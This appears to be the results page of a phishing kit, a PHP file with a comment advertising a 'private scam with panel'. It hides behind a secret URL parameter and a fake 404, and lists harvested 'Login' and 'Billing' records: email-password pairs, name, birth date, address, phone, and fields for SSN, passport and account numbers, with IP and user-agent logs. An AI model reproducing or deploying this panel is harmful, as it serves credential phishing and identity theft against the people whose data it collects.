<?php
session_start();
/*
yoυ wan'т a prιvaтe ѕcaм wιтн panel and oтнer opтιonѕ? => ix@oυтlooĸ.fr
*/ 
$setting = parse_ini_file('../../CP/se.php');
$getpss= $setting['setup_rzltpa'];

if(isset($_GET[$getpss])) 
{ 
} 
else 
{ 
header("HTTP/1.0 404 Not Found");
echo "You need to login first.\n";
die();
}
?>
<head>
<title>RZLT</title>
</head>
<br>
--------------------------------Login-------------------------------<div style='font-size:13px;font-family:monospace'><b>DEAR, <font
color='#cc1414'>you name here</font> THIS IS YOUR BILL RESULT ENJOY
!</b> <br>
<b><font color='#cc1414'>✪</font> <font
color='#146607'>[Email]</font></b>           :<b>admin@ae.com</b> <br>
<b><font color='#cc1414'>✪</font> <font
color='#146607'>[PS]</font></b>        :<b>cazanova</b> <br>
<b><font color='#cc1414'>✪</font> <font
color='#146607'>[IP]</font></b>              :<a
href='http://ip-api.com/127.0.0.1' target='_blank'>127.0.0.1 (Click
for more information)</a> <br><b><font color='#cc1414'>✪</font>
<font color='#146607'>[COUNTRY]</font></b>         : <b>  -  </b> <br>
<b><font color='#cc1414'>✪</font> <font color='#146607'>[BROWSER &
OS]</font></b>    : <b> - Windows 10</b> <br>
<b><font color='#cc1414'>✪</font> <font color='#146607'>[Copy User
Agent]</font></b>    : <b>Mozilla/5.0 (Windows NT 10.0; Win64; x64)
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100
Safari/537.36</b> <br>
<b><font color='#cc1414'>✪</font> <font
color='#146607'>[TIME]</font></b>            : <b>Sunday 28th of July
2019 02:07:31 PM</b> <br></div>
--------------------------------Billing-------------------------------<div style='font-size:13px;font-family:monospace'><b>DEAR, <font
color='#cc1414'>you name here</font> THIS IS YOUR BILL RESULT ENJOY
!</b> <br>
<b><font color='#cc1414'>✪</font> <font
color='#146607'>[Email]</font></b>           :<b>admin@ae.com</b> <br>
<b><font color='#cc1414'>✪</font> <font color='#146607'>[First
Name]</font></b>        :<b>Dani</b> <br>
<b><font color='#cc1414'>✪</font> <font color='#146607'>[M
Name]</font></b>        :<b></b> <br>
<b><font color='#cc1414'>✪</font> <font color='#146607'>[Last First
Name]</font></b>        :<b>Othman</b> <br>
<b><font color='#cc1414'>✪</font> <font color='#146607'>[Date of
birth]</font></b>        :<b>02/02/1988</b> <br>
<b><font color='#cc1414'>✪</font> <font
color='#146607'>[Address]</font></b>        :<b>Example EL STREET
5</b> <br>
<b><font color='#cc1414'>✪</font> <font
color='#146607'>[Town]</font></b>        :<b>Ariana</b> <br>
<b><font color='#cc1414'>✪</font> <font color='#146607'>[Zip
code]</font></b>        :<b>2055</b> <br>
<b><font color='#cc1414'>✪</font> <font
color='#146607'>[County]</font></b>        :<b>soussa</b> <br>
<b><font color='#cc1414'>✪</font> <font
color='#146607'>[Countrie]</font></b>        :<b>Tunisia</b> <br>
<b><font color='#cc1414'>✪</font> <font
color='#146607'>[Tel]</font></b>        :<b>55866988</b> <br>
<b><font color='#cc1414'>✪</font> <font
color='#146607'>[S/S/N]</font></b>        :<b></b> <br>
<b><font color='#cc1414'>✪</font> <font color='#146607'>[passport
number]</font></b>        :<b></b> <br>
<b><font color='#cc1414'>✪</font> <font color='#146607'>[ID
number]</font></b>        :<b></b> <br>
<b><font color='#cc1414'>✪</font> <font color='#146607'>[Account
number]</font></b>        :<b></b> <br>
<b><font color='#cc1414'>✪</font> <font color='#146607'>[Credit
limit]</font></b>        :<b></b> <br>
<b><font color='#cc1414'>✪</font> <font color='#146607'>[social
I_nsurance number .CA.]</font></b>        :<b></b> <br>
<b><font color='#cc1414'>✪</font> <font
color='#146607'>[IP]</font></b>              :<a
href='http://ip-api.com/127.0.0.1' target='_blank'>127.0.0.1 (Click
for more information)</a> <br><b><font color='#cc1414'>✪</font>
<font color='#146607'>[COUNTRY]</font></b>         : <b>  -  </b> <br>
<b><font color='#cc1414'>✪</font> <font color='#146607'>[BROWSER &
OS]</font></b>    : <b> - Windows 10</b> <br>
<b><font color='#cc1414'>✪</font> <font
color='#146607'>[TIME]</font></b>            : <b>Sunday 28th of July
2019 02:07:46 PM</b> <br></div>
           --------------------------------Login-------------------------------<div style='font-size:13px;font-family:monospace'><b>DEAR, <font
color='#cc1414'>you name here</font> THIS IS YOUR BILL RESULT ENJOY
!</b> <br>
<b><font color='#cc1414'>✪</font> <font
color='#146607'>[Email]</font></b>           :<b>admin@yahoo.com</b>
<br>
<b><font color='#cc1414'>✪</font> <font
color='#146607'>[PS]</font></b>        :<b>cazanova</b> <br>
<b><font color='#cc1414'>✪</font> <font
color='#146607'>[IP]</font></b>              :<a
href='http://ip-api.com/127.0.0.1' target='_blank'>127.0.0.1 (Click
for more information)</a> <br><b><font color='#cc1414'>✪</font>
<font color='#146607'>[COUNTRY]</font></b>         : <b>  -  </b> <br>
<b><font color='#cc1414'>✪</font> <font color='#146607'>[BROWSER &
OS]</font></b>    : <b> - Windows 10</b> <br>
<b><font color='#cc1414'>✪</font> <font color='#146607'>[Copy User
Agent]</font></b>    : <b>Mozilla/5.0 (Windows NT 10.0; Win64; x64)
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132
Safari/537.36</b> <br>
<b><font color='#cc1414'>✪</font> <font
color='#146607'>[TIME]</font></b>            : <b>Monday 23rd of
September 2019 08:01:55 PM</b> <br></div>
